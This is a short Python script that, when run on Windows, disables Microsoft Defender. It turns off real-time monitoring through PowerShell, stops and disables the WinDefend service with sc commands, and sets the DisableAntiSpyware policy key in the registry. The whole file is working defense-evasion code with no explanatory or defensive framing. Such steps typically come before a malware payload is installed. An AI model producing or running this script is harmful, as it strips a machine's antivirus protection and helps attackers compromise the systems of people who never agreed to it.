import os
import subprocess

def disable_windows_defender():
    # Disable real-time monitoring
    subprocess.run('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"', shell=True)
    # Disable Windows Defender services
    subprocess.run('sc stop WinDefend', shell=True)
    subprocess.run('sc config WinDefend start= disabled', shell=True)
    # Modify registry to disable Defender
    subprocess.run('reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f', shell=True)

if __name__ == "__main__":
    if os.name == 'nt':
        disable_windows_defender()
